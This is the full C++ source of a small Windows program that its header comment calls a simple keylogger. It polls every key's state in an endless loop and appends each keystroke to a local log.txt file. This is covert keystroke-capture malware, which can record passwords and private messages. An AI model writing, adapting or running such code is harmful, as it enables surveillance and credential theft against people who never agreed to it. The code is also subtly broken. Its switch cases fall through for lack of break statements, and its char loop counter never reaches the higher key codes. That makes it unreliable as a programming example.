// Simple keylogger program for Windows

#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <WinUser.h>
#include <fstream>

using namespace std;

void log();

int main()

{
	std::cout << "Hello World!\n";
	log();
	return 0;
  
}
void log() {
	char c;

	for (;;) {
		for (c = 8; c <= 222; c++) {
			if (GetAsyncKeyState(c) == -32767) {
				ofstream write("log.txt", ios::app);

				switch (c) {
					case 8: write << "<Backspace>";
					case 27: write << "<Esc>";
					case 127: write << "<Del>";
					case 32: write << " ";
					case 13: write << "<Enter>\n";
					default: write << c;
				}
			}
		}
	}
}

